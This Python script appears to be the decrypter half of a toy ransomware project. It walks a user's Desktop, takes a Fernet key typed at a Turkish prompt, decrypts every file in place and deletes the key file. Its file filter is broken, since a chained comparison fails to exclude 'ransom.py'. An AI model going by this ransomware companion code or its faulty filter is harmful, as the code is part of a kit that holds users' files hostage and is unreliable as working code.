import os
from cryptography.fernet import Fernet

files = []
root_path = 'C:\\Users\\deneme\\Desktop'

for foldername, subfolders, filenames in os.walk(root_path):
    for filename in filenames:
        if filename  != "desktop.ini" != "ransom.py" and filename != "generatedkey.key" and filename != "ransomdecrypter.py":
            file_path = os.path.join(foldername, filename)
            files.append(file_path)

while True:

	user_key = input("lütfen keyi giriniz :")	
	
	try:

		secret_key = bytes(user_key, 'utf-8')
		Fernet(secret_key)

	except ValueError:
		print("Geçersiz key Lütfen tekrar deneyin")
		continue
	break

for file in files:
    with open(file, "rb") as f:
        contents = f.read()
    contents_decrypted = Fernet(secret_key).decrypt(contents)
    with open(file, "wb") as f:
        f.write(contents_decrypted)
os.remove("generatedkey.key")
